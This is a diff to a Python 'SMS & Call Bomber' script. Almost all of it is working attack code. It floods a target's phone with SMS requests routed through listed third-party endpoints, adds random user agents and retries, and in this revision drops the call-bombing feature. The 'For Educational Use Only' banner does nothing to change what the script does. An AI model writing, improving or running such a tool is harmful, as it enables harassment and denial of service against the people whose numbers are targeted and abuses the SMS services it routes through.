@@ -10,26 +10,31 @@ class Colors:
     RED = '\033[91m'
     YELLOW = '\033[93m'
     CYAN = '\033[96m'
-    PURPLE = '\033[95m'
     RESET = '\033[0m'
 
-# Enhanced ASCII Art
+# Original ASCII Art
 SM_ART = f"""
-{Colors.PURPLE}═══════════════════════════════════════════════════════{Colors.RESET}
-{Colors.CYAN}  
-         ____ ___  ____  ____        ____ _  _______ ____  
-        / ___/ _ \|  _ \| __ )      / ___| |/ / ____| __ ) 
-       | |  | | | | | | |  _ \     | |   | ' /|  _| |  _ \ 
-       | |__| |_| | |_| | |_) |    | |___| . \| |___| |_) |
-        \____\___/|____/|____/      \____|_|\_\_____|____/ 
-{Colors.RESET}
-{Colors.YELLOW}         🌟 === SM CORPORATE 🍁 SMS & Call Bomber === 🌟{Colors.RESET}
-{Colors.CYAN}                Coded by: SM 🍁 For Educational Use Only!
-{Colors.PURPLE}═══════════════════════════════════════════════════════{Colors.RESET}
+{Colors.CYAN}
+                          _____ __  __ 
+                        / ____|  \/  |
+                       | (___ | \✨/ |
+                        \___ \| |\/| |
+                        ____) | |  | |
+                       |_____/|_|  |_|
+
+                 {Colors.YELLOW}=== SM CORPORATE 🍁 SM & Call Bomber ==={Colors.RESET}
+                 Coded by: SM 🍁 
+                 For Educational Use Only!
 """
 
 # API configuration
 APIS = [
+    {
+        "name": "Trial API",
+        "url": "https://bomberdemofor2hrtcs.vercel.app/api/trialapi",
+        "method": "GET",
+        "params": {"phone": "{number}", "type": "sms"}
+    },
     {
         "name": "Kalluraad API",
         "url": "http://kalluraad.42web.io/index.php",
@@ -59,22 +64,41 @@ def clear_screen():
 def validate_phone(phone):
     return phone.strip().isdigit() and len(phone.strip()) == 11 and phone.strip().startswith("01")
 
-def send_request(phone, api, request_type):
+def send_request(phone, api):
     url = api["url"]
     params = {key: value.replace("{number}", phone) for key, value in api["params"].items()}
     headers = {"User-Agent": random.choice(USER_AGENTS)}
 
-    try:
-        response = requests.get(url, params=params, headers=headers, timeout=10)
-        if response.status_code == 200:
-            print(f"{Colors.GREEN}Successful {request_type} via {api['name']}{Colors.RESET}")
-            return {"success": True}
-        else:
-            print(f"{Colors.RED}Failed {request_type} via {api['name']}{Colors.RESET}")
+    for attempt in range(2):  # Retry once on failure
+        try:
+            response = requests.get(url, params=params, headers=headers, timeout=10)
+            if response.status_code == 200:
+                try:
+                    # Check if response contains success indicators
+                    json_response = response.json()
+                    if json_response.get("success", False) or "success" in response.text.lower():
+                        print(f"{Colors.GREEN}SMS sent via {api['name']}{Colors.RESET}")
+                        return {"success": True}
+                    else:
+                        print(f"{Colors.RED}SMS failed via {api['name']}: {response.text[:100]}{Colors.RESET}")
+                        return {"success": False}
+                except ValueError:
+                    # Non-JSON response, check for success in text
+                    if "success" in response.text.lower():
+                        print(f"{Colors.GREEN}SMS sent via {api['name']}{Colors.RESET}")
+                        return {"success": True}
+                    else:
+                        print(f"{Colors.RED}SMS failed via {api['name']}: {response.text[:100]}{Colors.RESET}")
+                        return {"success": False}
+            else:
+                print(f"{Colors.RED}SMS failed via {api['name']}: Status {response.status_code}{Colors.RESET}")
+                return {"success": False}
+        except requests.RequestException as e:
+            print(f"{Colors.RED}SMS failed via {api['name']}: {str(e)}{Colors.RESET}")
+            if attempt == 0:
+                time.sleep(1)  # Wait before retry
+                continue
             return {"success": False}
-    except requests.RequestException:
-        print(f"{Colors.RED}Failed {request_type} via {api['name']}{Colors.RESET}")
-        return {"success": False}
 
 def main():
     clear_screen()
@@ -100,14 +124,13 @@ def main():
         input("Press Enter to exit...")
         return
 
-    # Count input for SMS and Calls
+    # Count input for SMS only
     try:
         sms_count = int(input(f"{Colors.CYAN}Enter number of SMS requests per number (0-100): {Colors.RESET}").strip())
-        call_count = int(input(f"{Colors.CYAN}Enter number of Call requests per number (0-100): {Colors.RESET}").strip())
-        if not (0 <= sms_count <= 100 and 0 <= call_count <= 100):
-            raise ValueError("Counts must be between 0 and 100")
-        if sms_count == 0 and call_count == 0:
-            print(f"{Colors.RED}Both SMS and Call counts cannot be 0!{Colors.RESET}")
+        if not (0 <= sms_count <= 100):
+            raise ValueError("Count must only be between 0 and 100")
+        if sms_count == 0:
+            print(f"{Colors.RED}SMS count cannot be 0!{Colors.RESET}")
             input("Press Enter to exit...")
             return
     except ValueError as e:
@@ -127,14 +150,9 @@ def main():
 
     # Process requests
     for phone in phone_numbers:
-        # Create request list based on non-zero counts
         request_list = []
-        if sms_count > 0:
-            for api in APIS:
-                request_list.extend([("sms", api) for _ in range(sms_count)])
-        if call_count > 0:
-            for api in APIS:
-                request_list.extend([("call", api) for _ in range(call_count)])
+        for api in APIS:
+            request_list.extend([(api) for _ in range(sms_count)])
         random.shuffle(request_list)
 
         if not request_list:
@@ -142,11 +160,11 @@ def main():
             continue
 
         print(f"\n{Colors.CYAN}Bombing number: {phone}{Colors.RESET}")
-        for request_type, api in request_list:
-            send_request(phone, api, request_type)
+        for api in request_list:
+            send_request(phone, api)
             time.sleep(delay + random.uniform(0, 1))
 
-    print(f"\n{Colors.GREEN}SMS and Call bombing completed successfully!{Colors.RESET}")
+    print(f"\n{Colors.GREEN}SMS bombing completed successfully!{Colors.RESET}")
     input("Press Enter to exit...")
 
 if __name__ == "__main__":
